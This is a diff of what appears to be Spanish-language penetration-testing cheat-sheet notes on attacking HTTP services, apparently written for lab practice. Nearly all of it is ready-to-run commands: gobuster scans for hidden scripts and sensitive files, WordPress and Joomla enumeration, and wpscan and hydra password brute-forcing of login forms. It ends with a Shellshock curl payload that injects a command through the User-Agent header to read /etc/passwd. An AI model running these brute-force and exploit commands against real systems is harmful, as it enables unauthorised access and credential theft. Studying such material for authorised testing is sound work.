@@ -1,43 +1,44 @@
-## Enumerar directorios
-### Gobuster
-```
-gobuster -u URL -w lista -e EXTENSIONES
-```
-### Metasploit module
-```
-auxiliary/scanner/http/brute_dirs
-```
+# HTTP
+Protocolo de comunicación que permite las transferencias de información en la World Wide Web sirve como base para muchos otros servicios
 
-## WordPress
-### WP scan full
+## Enumeración
+### Encontrar subdirectorios
 ```
-wpscan --url URL -e vp,u,cb,dbe
+gobuster -u URL -w wordlist
 ```
-### WP Scan Bruteforce login
+### Encontrar scripts ocultos
 ```
-wpscan --url URL --wordlist DICTIONARYPATH --username USERNAME
+gobuster -u URL -w wordlist -x .js, .py, .phpX , .aspx , .sh
 ```
-### Hydra
+### Encontrar archivos que puedan contener información sensible
 ```
-hydra -L USERLIST -P PASSLIST IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" 
-
+gobuster -u URL -w wordlist -x .txt, .conf , .config , .bak
 ```
-## Joomla
-### Joomscan Scan
+### Enumera wordpress
+```
+wpscan --url -e vp,u,cb,dbe
+```
+### Enumerar joomla
 ```
 perl joomscan.pl -u URL
 ```
 
-## BruteForce HTTP GET
-### Hydra
+
+## Ataques por fuerza bruta
+### Wordpress login bruteforce
+```
+wpscan --url URL --wordlist DICTIONARYPATH --username USERNAME
+```
+### Hydra POST login
+```
+hydra -L USERLIST -P PASSLIST IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" 
+```
+### Hydra BruteForce HTTP GET
 ```
 hydra -L UserList -P PassList IP http-get Directorio
 ```
-### Metasploit module
-```
-auxiliary/scanner/http/http_login
-```
-## Shellshock cgi-bin
+## Vulnerabilidades comunes sin metasploit
+### Shellshock cgi-bin
 ```
 curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://IP/cgi-bin/script.sh
 ```
